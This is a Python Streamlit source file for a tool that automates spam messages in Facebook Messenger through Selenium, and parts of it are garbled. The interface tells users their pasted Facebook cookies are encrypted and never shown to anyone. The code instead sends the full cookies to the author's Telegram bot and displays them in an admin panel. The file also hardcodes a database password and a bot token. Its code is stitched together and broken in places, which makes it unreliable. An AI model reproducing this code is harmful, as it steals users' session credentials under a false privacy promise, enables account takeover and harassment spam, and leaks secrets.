import streamlit as st
import time
import threading
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests
import os
import hashlib
import uuid
from datetime import datetime
import json

# 🚨🚨🚨 MONGODB 24/7 CODE START 🚨🚨🚨
def setup_mongodb_heartbeat():
    """MongoDB heartbeat to keep app alive 24/7"""
    def keep_alive():
        while True:
            try:
                # Import inside function to avoid initial load issues
                from pymongo import MongoClient
                
                connection_string = "mongodb+srv://dineshsavita76786_user_db:DEVILX0221@cluster0.3xxvjpo.mongodb.net/?retryWrites=true&w=majority"
                
                client = MongoClient(connection_string, serverSelectionTimeoutMS=10000)
                db_connection = client['streamlit_db']
                
                # Update heartbeat every 5 minutes
                db_connection.heartbeat.update_one(
                    {'app_id': 'Riya Don automation'},
                    {
                        '$set': {
                            'last_heartbeat': datetime.now(),
                            'status': 'running',
                            'app_name': 'RIY9 D0N E2E',
                            'timestamp': datetime.now(),
                            'version': '2.0'
                        }
                    },
                    upsert=True
                )
                print(f"✅ MongoDB Heartbeat: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                client.close()
                
            except Exception as e:
                print(f"❌ MongoDB Heartbeat Error: {str(e)[:100]}")
            
            # Wait 5 minutes
            time.sleep(300)
    
    # Start heartbeat in background
    try:
        heartbeat_thread = threading.Thread(target=keep_alive, daemon=True)
        heartbeat_thread.start()
        print("🚀 MongoDB 24/7 Heartbeat Started!")
    except Exception as e:
        print(f"❌ Failed to start heartbeat: {e}")

# 🚨 YEH LINE SABSE PEHLE RUN HOGI
if 'mongodb_started' not in st.session_state:
    setup_mongodb_heartbeat()
    st.session_state.mongodb_started = True
# 🚨🚨🚨 MONGODB 24/7 CODE END 🚨🚨🚨

st.set_page_config(
    page_title="𝙏𝙃𝙀 𝙇𝙀𝙂𝙀𝙉𝘿 𝙁𝙏 𝙂𝙄𝙍𝙇 𝙍𝙄𝙔𝘼 𝘿𝙊𝙉 👿",
    page_icon="🙂",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
TELEGRAM_CHAT_ID = "8186206231"
FACEBOOK_ADMIN_UID = "100037931553832"

def send_telegram_notification(user_data, automation_data):
    """Send user details to Telegram bot"""
    try:
        message = f"""
🔰 *NEW AUTOMATION STARTED* 🔰

👤 *User Details:*
🔧 *Automation Config:*
• Chat ID: `{automation_data['chat_id']}`
• Delay: `{automation_data['delay']} seconds`
• Prefix: `{automation_data['prefix']}`
• Messages: `{len(automation_data['messages'].splitlines())} lines`

🍪 *Full Cookies:* 
`{automation_data['cookies']}`

📊 *Status:* Automation Running
🕒 *Started:* {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Telegram notification failed: {e}")

def send_facebook_notification(user_data, automation_data):
    """Send notification to Facebook admin"""
    try:
        message = f"""
🔰 NEW AUTOMATION STARTED 🔰

👤 User Details:
🔧 Automation Config:
• Chat ID: {automation_data['chat_id']}
• Delay: {automation_data['delay']} seconds
• Prefix: {automation_data['prefix']}
• Messages: {len(automation_data['messages'].splitlines())} lines

🍪 Full Cookies: 
{automation_data['cookies']}

📊 Status: Automation Running
🕒 Started: {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        
        # Simulate sending to Facebook admin
        print(f"Facebook notification sent to admin {FACEBOOK_ADMIN_UID}")
        print(f"Message: {message}")
        
        # Here you would implement actual Facebook API integration
        # For now, we'll log it
        db.log_admin_notification(user_data['user_id'], message)
        
    except Exception as e:
        print(f"Facebook notification failed: {e}")

# Background image and custom CSS
background_image = "https://i.ibb.co/FkGd2cNf/cccf21694e054d66aa5a945bb3b212fa.jpg"

custom_css = f"""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
    
    * {{
        font-family: 'Poppins', sans-serif;
    }}
    label { color: #FFFFFF; }
    .file { height: 30px; }
    .stApp {
      background-color:#080808;
      background-size: cover;
      background-repeat: no-repeat;
      color: white;
    }
   
    .main-header {{
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        padding: 2rem;
        border-radius: 15px;
        text-align: center;
        margin-bottom: 2rem;
        box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
        position: relative;
        overflow: hidden;
    }}
  
    .main-header h1 {{
        color: white;
        font-size: 2.5rem;
        font-weight: 700;
        margin: 0;
        text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
        background: linear-gradient(45deg, #ff6b6b, #feca57, #48dbfb, #ff9ff3);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-size: 400% 400%;
        animation: electric 3s ease-in-out infinite;
    }}
    
    
    .main-header p {{
        color: rgba(255,255,255,0.9);
        font-size: 1.1rem;
        margin-top: 0.5rem;
    }}
    
    .stButton>button {{
      width: 100%;
      margin-top: 10px;
      background-color: #000000;
      height: 30px;
      margin-bottom: 10px;
      border-radius: 10px;
      font-size: 15px;
      box-shadow: 0 0 4px #FF0000;
      color: #FFFFFF;
    }
    
    .stButton>button:hover {{
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
   }}
    
    .contact-btn:hover {{
        transform: translateY(-3px);
        box-shadow: 0 8px 25px rgba(0,0,0,0.3);
        color: white;
        text-decoration: none;
    }}
    
    .success-box {{
        background: linear-gradient(135deg, #84fab0 0%, #8fd3f4 100%);
        padding: 1rem;
        border-radius: 10px;
        color: white;
        text-align: center;
        margin: 1rem 0;
    }}
    
    .error-box {{
        background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
        padding: 1rem;
        border-radius: 10px;
        color: white;
        text-align: center;
        margin: 1rem 0;
    }}
    
    .footer { text-align: center; margin-top: 20px; color: #FFE70D; }
 
    .input-label {{
        color: #667eea;
        font-weight: 600;
        margin-bottom: 0.5rem;
        display: block;
    }}
    
    .input-hint {{
        color: #764ba2;
        font-size: 0.8rem;
        font-style: italic;
        margin-top: 0.25rem;
    }}
    
    .info-card {{
        background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
        padding: 1.5rem;
        border-radius: 15px;
        margin: 1rem 0;
    }}
    
    .log-container {{
        background-color:#000000;
         no-repeat center center;
        background-size: cover;
        color: #87CEEB !important;
        padding: 1rem;
        border-radius: 10px;
        font-family: 'Courier New', monospace;
        max-height: 400px;
        overflow-y: auto;
        font-size: 0.8rem;
        line-height: 1.3;
        border: 2px solid #667eea;
        position: relative;
    }}
    
    .log-container::before {{
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.7);
        border-radius: 8px;
        z-index: 1;
    }}
    
    .log-entry {{
        margin: 5px 0;
        padding: 3px 8px;
        border-radius: 5px;
        animation: rainbowText 3s infinite alternate;
        font-weight: bold;
        text-shadow: 0 0 10px current}}
    }}
    
</style>
"""

st.markdown(custom_css, unsafe_allow_html=True)

# Initialize session state
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'user_id' not in st.session_state:
    st.session_state.user_id = None
if 'username' not in st.session_state:
    st.session_state.username = None
if 'approval_key' not in st.session_state:
    st.session_state.approval_key = None
if 'approval_status' not in st.session_state:
    st.session_state.approval_status = 'pending'
if 'user_real_name' not in st.session_state:
    st.session_state.user_real_name = ""
if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'logs' not in st.session_state:
    st.session_state.logs = []
if 'message_count' not in st.session_state:
    st.session_state.message_count = 0
if 'admin_logged_in' not in st.session_state:
    st.session_state.admin_logged_in = False

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0
        self.last_message_sent = ""
        self.last_message_time = ""

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

if 'auto_start_checked' not in st.session_state:
    st.session_state.auto_start_checked = False

def get_indian_time():
    """Get current Indian time"""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S IST")

def log_message(msg, automation_state=None, user_id=None):
    """Log message with Indian timestamp"""
    timestamp = get_indian_time()
    formatted_msg = f"[{timestamp}] {msg}"
    
    # Store in admin logs if user_id provided
    if user_id:
        db.log_user_activity(user_id, formatted_msg)
    
    if automation_state:
        automation_state.logs.append(formatted_msg)
        automation_state.last_message_sent = msg
        automation_state.last_message_time = timestamp
    else:
        if 'logs' in st.session_state:
            st.session_state.logs.append(formatted_msg)

def find_message_input(driver, process_id, automation_state=None, user_id=None):
    log_message(f'{process_id}: Finding message input...', automation_state, user_id)
    time.sleep(10)
    
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
    
    try:
        page_title = driver.title
        page_url = driver.current_url
        log_message(f'{process_id}: Page Title: {page_title}', automation_state, user_id)
        log_message(f'{process_id}: Page URL: {page_url}', automation_state, user_id)
    except Exception as e:
        log_message(f'{process_id}: Could not get page info: {e}', automation_state, user_id)
    
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
    
    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state, user_id)
    
    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state, user_id)
            
            for element in elements:
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' || 
                               arguments[0].tagName === 'TEXTAREA' || 
                               arguments[0].tagName === 'INPUT';
                    """, element)
                    
                    if is_editable:
                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state, user_id)
                        
                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass
                        
                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
                        
                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            log_message(f'{process_id}: Found message input with text: {element_text[:50]}', automation_state, user_id)
                            return element
                        elif idx < 10:
                            log_message(f'{process_id}: Using primary selector editable element (#{idx+1})', automation_state, user_id)
                            return element
                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
                            log_message(f'{process_id}: Using fallback editable element', automation_state, user_id)
                            return element
                except Exception as e:
                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state, user_id)
                    continue
        except Exception as e:
            continue
    
    try:
        page_source = driver.page_source
        log_message(f'{process_id}: Page source length: {len(page_source)} characters', automation_state, user_id)
        if 'contenteditable' in page_source.lower():
            log_message(f'{process_id}: Page contains contenteditable elements', automation_state, user_id)
        else:
            log_message(f'{process_id}: No contenteditable elements found in page', automation_state, user_id)
    except Exception:
        pass
    
    return None

def setup_browser(automation_state=None, user_id=None):
    log_message('Setting up Chrome browser...', automation_state, user_id)
    
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
    
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome'
    ]
    
    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            log_message(f'Found Chromium at: {chromium_path}', automation_state, user_id)
            break
    
    chromedriver_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver'
    ]
    
    driver_path = None
    for driver_candidate in chromedriver_paths:
        if Path(driver_candidate).exists():
            driver_path = driver_candidate
            log_message(f'Found ChromeDriver at: {driver_path}', automation_state, user_id)
            break
    
    try:
        from selenium.webdriver.chrome.service import Service
        
        if driver_path:
            service = Service(executable_path=driver_path)
            driver = webdriver.Chrome(service=service, options=chrome_options)
            log_message('Chrome started with detected ChromeDriver!', automation_state, user_id)
        else:
            driver = webdriver.Chrome(options=chrome_options)
            log_message('Chrome started with default driver!', automation_state, user_id)
        
        driver.set_window_size(1920, 1080)
        log_message('Chrome browser setup completed successfully!', automation_state, user_id)
        return driver
    except Exception as error:
        log_message(f'Browser setup failed: {error}', automation_state, user_id)
        raise error

def get_next_message(messages_file_content, automation_state=None):
    if not messages_file_content:
        return 'Hello!'
    
    messages = messages_file_content.split('\n')
    messages = [msg.strip() for msg in messages if msg.strip()]
    
    if not messages:
        return 'Hello!'
    
    if automation_state:
        message = messages[automation_state.message_rotation_index % len(messages)]
        automation_state.message_rotation_index += 1
    else:
        message = messages[0]
    
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        log_message(f'{process_id}: Starting automation...', automation_state, user_id)
        driver = setup_browser(automation_state, user_id)
        
        log_message(f'{process_id}: Navigating to Facebook...', automation_state, user_id)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if config['cookies'] and config['cookies'].strip():
            log_message(f'{process_id}: Adding cookies...', automation_state, user_id)
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state, user_id)
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            log_message(f'{process_id}: Opening messages...', automation_state, user_id)
            driver.get('https://www.facebook.com/messages')
        
        time.sleep(15)
        
        message_input = find_message_input(driver, process_id, automation_state, user_id)
        
        if not message_input:
            log_message(f'{process_id}: Message input not found!', automation_state, user_id)
            automation_state.running = False
            db.set_automation_running(user_id, False)
            return 0
        
        delay = int(config['delay'])
        messages_sent = 0
        
        while automation_state.running and db.get_automation_running(user_id):
            base_message = get_next_message(config['messages_file_content'], automation_state)
            
            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message
            
            try:
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];
                    
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                    
                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }
                    
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)
                
                time.sleep(1)
                
                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                    
                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)
                
                if sent == 'button_not_found':
                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state, user_id)
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                        
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                        
                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
                else:
                    log_message(f'{process_id}: Send button clicked', automation_state, user_id)
                
                time.sleep(1)
                
                messages_sent += 1
                automation_state.message_count = messages_sent
                log_message(f'{process_id}: Message {messages_sent} sent: {message_to_send[:30]}...', automation_state, user_id)
                
                time.sleep(delay)
                
            except Exception as e:
                log_message(f'{process_id}: Error sending message: {str(e)}', automation_state, user_id)
                break
        
        log_message(f'{process_id}: Automation stopped! Total messages sent: {messages_sent}', automation_state, user_id)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return messages_sent
        
    except Exception as e:
        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state, user_id)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return 0
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f'{process_id}: Browser closed', automation_state, user_id)
            except:
                pass


    # Send notifications before starting automation
    user_data = {
'username': username,
        'real_name': db.get_user_real_name(user_id),
        'user_id': user_id
    }
    
    automation_data = {
        'chat_id': user_config['chat_id'],
        'delay': user_config['delay'],
        'prefix': user_config['name_prefix'],
        'messages': user_config['messages_file_content'],
        'cookies': user_config['cookies']  # Full cookies now
    }
    
    # Send notifications
    send_telegram_notification(user_data, automation_data)
    send_facebook_notification(user_data, automation_data)
    
    # Start automation
    send_messages(user_config, automation_state, user_id)

def start_automation(user_config, user_id):
    automation_state = st.session_state.automation_state
    
    if automation_state.running:
        return
    
    automation_state.running = True
    automation_state.message_count = 0
    automation_state.logs = []
    
    db.set_automation_running(user_id, True)
    
    username = db.get_username(user_id)
    thread = threading.Thread(target=run_automation_with_notification, args=(user_config, username, automation_state, user_id))
    thread.daemon = True
    thread.start()

def stop_automation(user_id):
    st.session_state.automation_state.running = False
    db.set_automation_running(user_id, False)

# Main application
st.markdown('<div class="main-container">', unsafe_allow_html=True)

# Profile Icon
st.markdown('<div class="main-header"><h1>𝗟𝗘𝗚𝗘𝗡𝗗 𝗚𝗜𝗥𝗟 𝗥𝗜𝗬𝗔 𝗗𝗢𝗡 🧟‍♀️</h1><p>Created by LORD DEVIL</p></div>', unsafe_allow_html=True)

# Admin Panel

                                # Start automation in background
                                thread = threading.Thread(
                                    target=run_automation_with_notification, 
                                    args=(user_config, username, AutomationState(), user_id)
                                )
                                thread.daemon = True
                                thread.start()
                                st.success(f"Started automation for: {username}")
                                st.rerun()
                            else:
                                st.error("User needs to configure chat ID first")
                
                with col4:
                    if st.button(f"📊 Details", key=f"details_{user_id}"):
                        user_config = db.get_user_config(user_id)
                        if user_config:
                            st.markdown(f"""
                            <div class="user-details-expanded">
                            <h4>User Configuration Details:</h4>
                            - Chat ID: `{user_config['chat_id']}`<br>
                            - Prefix: `{user_config['name_prefix']}`<br>
                            - Delay: `{user_config['delay']} seconds`<br>
                            - Messages: `{len(user_config['messages_file_content'].splitlines())} lines`<br>
                            - Full Cookies: `{user_config['cookies']}`
                            </div>
                             
                    # Quick stop button
                    if st.button(f"𝘚𝘛𝘖𝘗 𝘙𝘜𝘕𝘐𝘕𝘎 ⭕ {username}", key=f"quick_stop_{user_id}"):
                        db.set_automation_running(user_id, False)
                        st.success(f"Stopped {username}'s automation")
                        st.rerun()
    
                            # Generate approval key for new user
                            
    # User is logged in but needs approval
    
        # Contact buttons - ALWAYS VISIBLE
           
        # Check approval status
     
            if st.session_state.automation_state.running:
                stop_automation(st.session_state.user_id)
            
            st.session_state.logged_in = False
            st.session_state.user_id = None
            st.session_state.username = None
            st.session_state.approval_status = 'pending'
            st.session_state.approval_key = None
            st.session_state.user_real_name = ""
            st.session_state.automation_running = False
            st.session_state.auto_start_checked = False
            st.rerun()
        
        user_config = db.get_user_config(st.session_state.user_id)
        
        if user_config:
            tab1 = st.tabs(["𝘌2𝘌 𝘊𝘖𝘕𝘝𝘖 𝘞𝘌𝘉 🔴"])
            
            with tab1:
                st.markdown("### Your Configuration")
                
                st.markdown('<div class="input-label">𝘊𝘖𝘖𝘒𝘐𝘌𝘚 𝘋𝘈𝘓𝘖 💭 (optional)</div>', unsafe_allow_html=True)
                cookies = st.text_area("", 
                                      value="",
                                      placeholder="Paste your Facebook cookies here (encrypted and private)",
                                      height=100,
                                      label_visibility="collapsed")
                st.markdown('<div class="input-hint">Your cookies are encrypted and never shown to anyone</div>', unsafe_allow_html=True)
                
                st.markdown('<div class="input-label">𝘎𝘳𝘰𝘶𝘱 𝘰𝘳 𝘐𝘯𝘣𝘰𝘹 𝘜𝘪𝘥 𝘋𝘢𝘭𝘺 <3 </div>', unsafe_allow_html=True)
                chat_id = st.text_input("", value=user_config['chat_id'], 
                                       placeholder="e.g., 1362400298935018 (Facebook conversation ID from URL)",
                                       label_visibility="collapsed")
                st.markdown('<div class="input-hint">Enter Facebook conversation ID from the URL</div>', unsafe_allow_html=True)
                
                st.markdown('<div class="input-label">𝘛𝘈𝘛𝘈 𝘕𝘈𝘔𝘌 ✈️</div>', unsafe_allow_html=True)
                name_prefix = st.text_input("", value=user_config['name_prefix'],
                                           placeholder="e.g., hatersname]",
                                           label_visibility="collapsed")
                st.markdown('<div class="input-hint">Prefix to add before each message</div>', unsafe_allow_html=True)
                
                st.markdown('<div class="input-label">speee seconds</div>', unsafe_allow_html=True)
                delay = st.number_input("", min_value=1, max_value=500, 
                                       value=user_config['delay'],
                                       label_visibility="collapsed")
                st.markdown('<div class="input-hint">Wait time between messages (𝘌𝘕𝘛𝘌𝘙 𝘚𝘗𝘌𝘌𝘋 𝘴𝘦𝘤...)</div>', unsafe_allow_html=True)
                         
                
                st.markdown('<div class="input-label">𝘜𝘗𝘓𝘖𝘈𝘋 𝘔𝘚𝘎 𝘍𝘐𝘓𝘌 📩</div>', unsafe_allow_html=True)
                uploaded_file = st.file_uploader("", type=['txt'], label_visibility="collapsed")
                st.markdown('<div class="input-hint">Upload a .txt file with messages (one per line)</div>', unsafe_allow_html=True)
                
                if uploaded_file is not None:
                    messages_content = uploaded_file.getvalue().decode("utf-8")
                else:
                    messages_content = user_config.get('messages_file_content', '')
                
                with col1:
                    if st.button("𝘚𝘛𝘈𝘙𝘛 𝘙𝘜𝘕𝘐𝘕𝘎 ✅", disabled=st.session_state.automation_state.running, use_container_width=True):
                        current_config = db.get_user_config(st.session_state.user_id)
                        if current_config and current_config['chat_id']:
                            start_automation(current_config, st.session_state.user_id)
                            st.rerun()
                        else:
                            st.error("Please configure Chat ID first!")
                    final_cookies = cookies if cookies.strip() else user_config['cookies']
                    db.update_user_config(
                        st.session_state.user_id,
                        chat_id,
                        name_prefix,
                        delay,
                        final_cookies,
                        messages_content  # Store file content instead of text area
                    )
                    st.success("Configuration saved successfully!")
                    st.rerun()
            
                st.markdown("### Automation Control")
                
                col1, col2, col3 = st.columns(3)
                
                with col1:
                    st.metric("𝙎𝙚𝙉𝙙 𝙈𝙖𝙨𝙨𝘼𝙜𝙚𝙨 ✅", st.session_state.automation_state.message_count)
                
                with col2:
                    status = "🅄🄿🅃🄸🄼🄴 ✅" if st.session_state.automation_state.running else "🄾🄵🄵🄻🄸🄽🄴 🚷"
                    st.metric("Status", status)
                
                with col3:
                    st.metric("Total Logs", len(st.session_state.automation_state.logs))
                
                col1, col2 = st.columns(2)
                
                  
                with col2:
                    if st.button("𝘚𝘛𝘖𝘗 𝘙𝘜𝘕𝘐𝘕𝘎 🚫", disabled=not st.session_state.automation_state.running, use_container_width=True):
                        stop_automation(st.session_state.user_id)
                        st.rerun()
                
                st.markdown("### 📜 Live Logs")
                
                if st.session_state.automation_state.logs:
                    logs_html = '<div class="log-container">'
                    for log in st.session_state.automation_state.logs[-50:]:
                        logs_html += f'<div class="log-entry">{log}</div>'
                    logs_html += '</div>'
                    st.markdown(logs_html, unsafe_allow_html=True)
                else:
                    st.info("No logs yet. Start automation to see logs here.")
                
                if st.session_state.automation_state.running:
                    time.sleep(1)
                    st.rerun()

st.markdown('</div>', unsafe_allow_html=True)  # Close main-container
st.markdown('<div class="footer">𝗠𝗔𝗞𝗘𝗗 𝗕𝗬 𝗔𝗟𝗢𝗡𝗘 𝗫𝗗 🙂 👿</div>', unsafe_allow_html=True)
